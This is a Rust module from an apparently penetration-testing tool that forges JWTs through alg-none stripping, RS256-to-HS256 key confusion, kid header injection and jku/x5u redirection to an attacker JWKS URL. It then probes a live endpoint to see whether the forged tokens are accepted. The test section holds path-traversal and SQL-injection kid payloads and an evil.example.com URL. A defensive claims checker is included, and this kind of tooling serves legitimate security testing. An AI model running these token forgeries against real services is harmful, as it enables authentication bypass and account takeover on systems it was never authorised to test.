//! JWT attack research probes — Phase 7.
//!
//! Strategy pattern: each [`JwtAttackStrategy`] represents one JWT attack class.
//! Specification pattern: [`JwtSpec`] checks token claims for weaknesses without
//! network access.  [`JwtProbe`] runs all strategies against a live endpoint via
//! a simple async HTTP trait.

use anyhow::{anyhow, Result};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use thiserror::Error;

// ──────────────────────────────────────────────────────────────────────────────
// Severity (local copy — zeus-core has no dep on zeus-output)
// ──────────────────────────────────────────────────────────────────────────────

/// CVSS-inspired severity for a reported finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Low      => write!(f, "LOW"),
            Self::Medium   => write!(f, "MEDIUM"),
            Self::High     => write!(f, "HIGH"),
            Self::Critical => write!(f, "CRITICAL"),
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Error
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum JwtProbeError {
    #[error("malformed token: {0}")]
    Malformed(String),
    #[error("base64 decode error: {0}")]
    Base64(String),
    #[error("json error: {0}")]
    Json(String),
}

// ──────────────────────────────────────────────────────────────────────────────
// Base64url helpers — inline, no external dep
// ──────────────────────────────────────────────────────────────────────────────

/// Encode `data` as unpadded base64url (RFC 4648 §5).
pub fn b64url_encode(data: &[u8]) -> String {
    const ALPHA: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPHA[((n >> 18) & 0x3F) as usize] as char);
        out.push(ALPHA[((n >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 { out.push(ALPHA[((n >> 6) & 0x3F) as usize] as char); }
        if chunk.len() > 2 { out.push(ALPHA[(n & 0x3F) as usize] as char); }
    }
    // Convert to url-safe and strip padding.
    out.replace('+', "-").replace('/', "_")
}

/// Decode unpadded base64url.
pub fn b64url_decode(s: &str) -> Result<Vec<u8>, JwtProbeError> {
    let mut std = s.replace('-', "+").replace('_', "/");
    match std.len() % 4 {
        2 => std.push_str("=="),
        3 => std.push('='),
        _ => {}
    }
    b64_std_decode(&std).map_err(|e| JwtProbeError::Base64(e))
}

fn b64_std_decode(s: &str) -> Result<Vec<u8>, String> {
    fn val(c: u8) -> Result<u8, String> {
        match c {
            b'A'..=b'Z' => Ok(c - b'A'),
            b'a'..=b'z' => Ok(c - b'a' + 26),
            b'0'..=b'9' => Ok(c - b'0' + 52),
            b'+'        => Ok(62),
            b'/'        => Ok(63),
            b'='        => Ok(0),
            _           => Err(format!("invalid char 0x{c:02x}")),
        }
    }
    let b = s.as_bytes();
    if b.len() % 4 != 0 {
        return Err(format!("length {} not a multiple of 4", b.len()));
    }
    let mut out = Vec::with_capacity(b.len() / 4 * 3);
    for ch in b.chunks(4) {
        let (a, bv, c, d) = (val(ch[0])?, val(ch[1])?, val(ch[2])?, val(ch[3])?);
        let n = ((a as u32) << 18) | ((bv as u32) << 12) | ((c as u32) << 6) | (d as u32);
        out.push(((n >> 16) & 0xFF) as u8);
        if ch[2] != b'=' { out.push(((n >> 8) & 0xFF) as u8); }
        if ch[3] != b'=' { out.push((n & 0xFF) as u8); }
    }
    Ok(out)
}

// ──────────────────────────────────────────────────────────────────────────────
// Token helpers
// ──────────────────────────────────────────────────────────────────────────────

fn split_token(token: &str) -> Result<(&str, &str, &str), JwtProbeError> {
    let mut it = token.splitn(3, '.');
    let h = it.next().ok_or_else(|| JwtProbeError::Malformed("missing header".into()))?;
    let p = it.next().ok_or_else(|| JwtProbeError::Malformed("missing payload".into()))?;
    let s = it.next().ok_or_else(|| JwtProbeError::Malformed("missing signature".into()))?;
    Ok((h, p, s))
}

fn decode_json(b64: &str) -> Result<serde_json::Value, JwtProbeError> {
    let bytes = b64url_decode(b64)?;
    serde_json::from_slice(&bytes).map_err(|e| JwtProbeError::Json(e.to_string()))
}

fn encode_json(v: &serde_json::Value) -> Result<String, JwtProbeError> {
    let bytes = serde_json::to_vec(v).map_err(|e| JwtProbeError::Json(e.to_string()))?;
    Ok(b64url_encode(&bytes))
}

fn hmac_sha256_sign(key: &[u8], msg: &str) -> Result<String> {
    let mut mac = Hmac::<Sha256>::new_from_slice(key)
        .map_err(|e| anyhow!("HMAC key error: {e}"))?;
    mac.update(msg.as_bytes());
    Ok(b64url_encode(&mac.finalize().into_bytes()))
}

// ──────────────────────────────────────────────────────────────────────────────
// Strategy trait
// ──────────────────────────────────────────────────────────────────────────────

/// Strategy pattern — each implementation is one JWT attack class.
pub trait JwtAttackStrategy: Send + Sync {
    fn name(&self) -> &'static str;
    fn description(&self) -> &'static str;
    /// Forge a token from `original`.  Returns the forged JWT string.
    fn forge_token(&self, original: &str) -> Result<String>;
}

// ──────────────────────────────────────────────────────────────────────────────
// AlgNoneAttack
// ──────────────────────────────────────────────────────────────────────────────

/// Strip the signature and set `alg` to `"none"`.
#[derive(Debug, Clone)]
pub struct AlgNoneAttack;

impl JwtAttackStrategy for AlgNoneAttack {
    fn name(&self) -> &'static str { "alg-none" }
    fn description(&self) -> &'static str {
        "Replace alg with 'none' and remove the signature. \
         Vulnerable libraries accept the unsigned token."
    }
    fn forge_token(&self, original: &str) -> Result<String> {
        let (hb, pb, _) = split_token(original).map_err(|e| anyhow!("{e}"))?;
        let mut h: serde_json::Value = decode_json(hb).map_err(|e| anyhow!("{e}"))?;
        h["alg"] = serde_json::json!("none");
        let nh = encode_json(&h).map_err(|e| anyhow!("{e}"))?;
        Ok(format!("{nh}.{pb}."))
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// AlgorithmConfusionAttack  (RS256 → HS256)
// ──────────────────────────────────────────────────────────────────────────────

/// Change `alg` to HS256 and sign with the server's RSA public key as the HMAC
/// secret.  Vulnerable libraries that derive the verification path from the
/// token header will use the public key bytes as the HMAC key.
#[derive(Debug, Clone)]
pub struct AlgorithmConfusionAttack {
    /// PEM-encoded RSA public key used as the HMAC-SHA256 secret.
    pub public_key_pem: String,
}

impl JwtAttackStrategy for AlgorithmConfusionAttack {
    fn name(&self) -> &'static str { "algorithm-confusion-rs256-hs256" }
    fn description(&self) -> &'static str {
        "Change alg from RS256 to HS256 and sign with the server's RSA public key \
         as the HMAC secret."
    }
    fn forge_token(&self, original: &str) -> Result<String> {
        let (hb, pb, _) = split_token(original).map_err(|e| anyhow!("{e}"))?;
        let mut h: serde_json::Value = decode_json(hb).map_err(|e| anyhow!("{e}"))?;
        h["alg"] = serde_json::json!("HS256");
        let nh = encode_json(&h).map_err(|e| anyhow!("{e}"))?;
        let input = format!("{nh}.{pb}");
        let sig = hmac_sha256_sign(self.public_key_pem.as_bytes(), &input)?;
        Ok(format!("{input}.{sig}"))
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// KidInjectionAttack
// ──────────────────────────────────────────────────────────────────────────────

/// Inject a malicious `kid` to redirect key lookup (path traversal or SQL
/// injection), then sign with the resulting predictable/empty secret.
#[derive(Debug, Clone)]
pub struct KidInjectionAttack {
    /// Malicious `kid` value, e.g. `"../../dev/null"` or `"' OR 1=1--"`.
    pub kid_payload: String,
    /// HMAC secret that matches what the server will derive.
    /// Empty for `/dev/null` path traversal (empty-string HMAC).
    pub sign_with: Vec<u8>,
}

impl JwtAttackStrategy for KidInjectionAttack {
    fn name(&self) -> &'static str { "kid-injection" }
    fn description(&self) -> &'static str {
        "Inject a malicious 'kid' header to redirect key lookup to /dev/null or \
         trigger SQL injection, then sign with the resulting empty/predictable key."
    }
    fn forge_token(&self, original: &str) -> Result<String> {
        let (hb, pb, _) = split_token(original).map_err(|e| anyhow!("{e}"))?;
        let mut h: serde_json::Value = decode_json(hb).map_err(|e| anyhow!("{e}"))?;
        h["kid"] = serde_json::json!(self.kid_payload);
        // Ensure symmetric alg so we can sign.
        if h["alg"].as_str().map(|a| a.starts_with("RS") || a.starts_with("ES")).unwrap_or(false) {
            h["alg"] = serde_json::json!("HS256");
        }
        let nh = encode_json(&h).map_err(|e| anyhow!("{e}"))?;
        let input = format!("{nh}.{pb}");
        let sig = hmac_sha256_sign(&self.sign_with, &input)?;
        Ok(format!("{input}.{sig}"))
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// JwksUriConfusion
// ──────────────────────────────────────────────────────────────────────────────

/// Replace `jku`/`x5u` with an attacker-controlled JWKS URL.  Libraries that
/// fetch the JWKS from the token header without whitelist validation will trust
/// the attacker's public key.
#[derive(Debug, Clone)]
pub struct JwksUriConfusion {
    /// URL of the attacker-controlled JWKS endpoint.
    pub attacker_jwks_uri: String,
}

impl JwtAttackStrategy for JwksUriConfusion {
    fn name(&self) -> &'static str { "jwks-uri-confusion" }
    fn description(&self) -> &'static str {
        "Replace the 'jku' header with an attacker-controlled JWKS URL. \
         Vulnerable libraries fetch and trust that endpoint to retrieve the \
         verification key."
    }
    /// Returns the header-modified token; the signature field is preserved
    /// (attacker replaces it with their own out-of-band).
    fn forge_token(&self, original: &str) -> Result<String> {
        let (hb, pb, sig) = split_token(original).map_err(|e| anyhow!("{e}"))?;
        let mut h: serde_json::Value = decode_json(hb).map_err(|e| anyhow!("{e}"))?;
        h["jku"] = serde_json::json!(self.attacker_jwks_uri);
        h["x5u"] = serde_json::json!(self.attacker_jwks_uri);
        let nh = encode_json(&h).map_err(|e| anyhow!("{e}"))?;
        Ok(format!("{nh}.{pb}.{sig}"))
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// JwtWeakness + JwtSpec  (Specification pattern)
// ──────────────────────────────────────────────────────────────────────────────

/// A discrete weakness found by [`JwtSpec::check`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum JwtWeakness {
    /// Token header declares `alg: none`.
    NoneAlgorithmHeader,
    /// Token uses an algorithm not in the allowed list.
    WeakAlgorithm(String),
    /// Token lacks an `exp` claim.
    NoExpiration,
    /// Token `kid` header looks injectable (path traversal / SQL).
    KidInjectable,
    /// Server accepted a forged `alg:none` token (from live probe).
    AlgNoneAccepted,
}

/// Specification that checks a JWT token against required properties without
/// making any network calls.
#[derive(Debug, Clone)]
pub struct JwtSpec {
    /// Fail if the `exp` claim is absent.
    pub require_exp: bool,
    /// Fail if the `iat` claim is absent.
    pub require_iat: bool,
    /// Only these algorithm identifiers are considered safe.
    /// An empty list skips the algorithm check.
    pub allowed_algorithms: Vec<String>,
}

impl JwtSpec {
    /// Inspect `token` and return all [`JwtWeakness`] values found.
    pub fn check(&self, token: &str) -> Vec<JwtWeakness> {
        let mut out = Vec::new();
        let parts: Vec<&str> = token.splitn(3, '.').collect();
        if parts.len() != 3 { return out; }

        let header  = match decode_json(parts[0]) { Ok(v) => v, Err(_) => return out };
        let payload = match decode_json(parts[1]) { Ok(v) => v, Err(_) => return out };

        // Algorithm checks.
        if let Some(alg) = header["alg"].as_str() {
            if alg.eq_ignore_ascii_case("none") {
                out.push(JwtWeakness::NoneAlgorithmHeader);
            } else if !self.allowed_algorithms.is_empty()
                && !self.allowed_algorithms.iter().any(|a| a.eq_ignore_ascii_case(alg))
            {
                out.push(JwtWeakness::WeakAlgorithm(alg.to_owned()));
            }
        }

        // kid injection heuristic.
        if let Some(kid) = header["kid"].as_str() {
            let suspicious = kid.contains("..")
                || kid.contains('\'')
                || kid.contains("--")
                || kid.contains('\0')
                || kid.to_lowercase().contains(" or ");
            if suspicious { out.push(JwtWeakness::KidInjectable); }
        }

        // Expiration.
        if self.require_exp && payload.get("exp").map(|v| v.is_null()).unwrap_or(true) {
            out.push(JwtWeakness::NoExpiration);
        }

        out
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// JwtFinding
// ──────────────────────────────────────────────────────────────────────────────

/// Result of testing one JWT attack strategy against a live endpoint.
#[derive(Debug, Clone)]
pub struct JwtFinding {
    /// Name of the strategy that produced this finding.
    pub strategy: &'static str,
    /// The forged token submitted to the server.
    pub forged_token: String,
    /// Whether the server returned HTTP 200 or 204 (accepted).
    pub server_accepted: bool,
    /// Critical if accepted, Low if rejected.
    pub severity: Severity,
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal HTTP abstraction (avoids circular dep with zeus-net)
// ──────────────────────────────────────────────────────────────────────────────

/// Minimal async HTTP GET that callers must implement.
/// `zeus-net` consumers can wrap `HttpClient` in a newtype to satisfy this.
#[async_trait::async_trait]
pub trait JwtHttpClient: Send + Sync {
    /// Perform GET `url` with `Authorization: Bearer <token>`.
    /// Returns the HTTP status code.
    async fn bearer_get(&self, url: &str, token: &str) -> Result<u16>;
}

// ──────────────────────────────────────────────────────────────────────────────
// JwtProbe
// ──────────────────────────────────────────────────────────────────────────────

/// Runs a collection of [`JwtAttackStrategy`] implementations against a live
/// authorization endpoint.
pub struct JwtProbe {
    pub strategies: Vec<Box<dyn JwtAttackStrategy>>,
}

impl JwtProbe {
    /// Pre-load with every built-in strategy.
    ///
    /// * `public_key_pem` — used for the RS256→HS256 confusion attack.
    /// * `kid_payloads`   — list of malicious `kid` strings to try.
    /// * `attacker_jwks`  — attacker-controlled JWKS URL for `jku` confusion.
    pub fn all_attacks(
        public_key_pem: impl Into<String>,
        kid_payloads: Vec<String>,
        attacker_jwks: impl Into<String>,
    ) -> Self {
        let pem = public_key_pem.into();
        let jwks = attacker_jwks.into();
        let mut strategies: Vec<Box<dyn JwtAttackStrategy>> = vec![
            Box::new(AlgNoneAttack),
            Box::new(AlgorithmConfusionAttack { public_key_pem: pem }),
            Box::new(JwksUriConfusion { attacker_jwks_uri: jwks }),
        ];
        for kid in kid_payloads {
            strategies.push(Box::new(KidInjectionAttack {
                kid_payload: kid,
                sign_with: Vec::new(),
            }));
        }
        Self { strategies }
    }

    /// Probe `auth_endpoint` with each strategy's forged token.
    ///
    /// HTTP 200 / 204 → `server_accepted = true`, `severity = Critical`.
    pub async fn probe(
        &self,
        client: &dyn JwtHttpClient,
        auth_endpoint: &str,
        token: &str,
    ) -> Result<Vec<JwtFinding>> {
        let mut findings = Vec::new();
        for strategy in &self.strategies {
            let forged = match strategy.forge_token(token) {
                Ok(t) => t,
                Err(e) => {
                    tracing::warn!(strategy = strategy.name(), error = %e, "forge_token failed");
                    continue;
                }
            };
            let status = client.bearer_get(auth_endpoint, &forged).await.unwrap_or(0);
            let accepted = status == 200 || status == 204;
            findings.push(JwtFinding {
                strategy: strategy.name(),
                forged_token: forged,
                server_accepted: accepted,
                severity: if accepted { Severity::Critical } else { Severity::Low },
            });
        }
        Ok(findings)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // header: {"alg":"RS256","typ":"JWT"}
    // payload: {"sub":"1234567890","exp":9999999999}
    const SAMPLE: &str =
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.\
         eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjo5OTk5OTk5OTk5fQ.\
         SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    #[test]
    fn b64url_roundtrip() {
        let data: &[u8] = b"hello \x00 world \xFF";
        assert_eq!(b64url_decode(&b64url_encode(data)).unwrap(), data);
    }

    #[test]
    fn b64url_no_padding_or_standard_chars() {
        let s = b64url_encode(b"any bytes ~~~");
        assert!(!s.contains('+') && !s.contains('/') && !s.contains('='));
    }

    #[test]
    fn alg_none_strips_sig_sets_alg() {
        let forged = AlgNoneAttack.forge_token(SAMPLE).unwrap();
        let parts: Vec<&str> = forged.splitn(3, '.').collect();
        assert!(parts[2].is_empty(), "signature must be empty");
        let h = decode_json(parts[0]).unwrap();
        assert_eq!(h["alg"].as_str(), Some("none"));
    }

    #[test]
    fn algorithm_confusion_sets_hs256_and_has_sig() {
        let a = AlgorithmConfusionAttack { public_key_pem: "FAKE_PEM".into() };
        let forged = a.forge_token(SAMPLE).unwrap();
        let parts: Vec<&str> = forged.splitn(3, '.').collect();
        let h = decode_json(parts[0]).unwrap();
        assert_eq!(h["alg"].as_str(), Some("HS256"));
        assert!(!parts[2].is_empty());
    }

    #[test]
    fn kid_injection_sets_kid() {
        let a = KidInjectionAttack { kid_payload: "../../dev/null".into(), sign_with: vec![] };
        let forged = a.forge_token(SAMPLE).unwrap();
        let parts: Vec<&str> = forged.splitn(3, '.').collect();
        let h = decode_json(parts[0]).unwrap();
        assert_eq!(h["kid"].as_str(), Some("../../dev/null"));
    }

    #[test]
    fn jwks_uri_sets_jku_and_x5u() {
        let a = JwksUriConfusion { attacker_jwks_uri: "https://evil.example.com/jwks.json".into() };
        let forged = a.forge_token(SAMPLE).unwrap();
        let parts: Vec<&str> = forged.splitn(3, '.').collect();
        let h = decode_json(parts[0]).unwrap();
        assert_eq!(h["jku"].as_str(), Some("https://evil.example.com/jwks.json"));
        assert_eq!(h["x5u"].as_str(), Some("https://evil.example.com/jwks.json"));
    }

    #[test]
    fn jwt_spec_detects_no_expiration() {
        // payload: {"sub":"x"} — no exp
        let token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4In0.sig";
        let spec = JwtSpec { require_exp: true, require_iat: false, allowed_algorithms: vec![] };
        let w = spec.check(token);
        assert!(w.contains(&JwtWeakness::NoExpiration));
    }

    #[test]
    fn jwt_spec_detects_weak_algorithm() {
        let spec = JwtSpec {
            require_exp: false,
            require_iat: false,
            allowed_algorithms: vec!["ES256".into()],
        };
        let w = spec.check(SAMPLE); // SAMPLE uses RS256
        assert!(w.iter().any(|x| matches!(x, JwtWeakness::WeakAlgorithm(a) if a == "RS256")));
    }

    #[test]
    fn jwt_spec_clean_is_empty() {
        let spec = JwtSpec {
            require_exp: true,
            require_iat: false,
            allowed_algorithms: vec!["RS256".into()],
        };
        assert!(spec.check(SAMPLE).is_empty());
    }
}
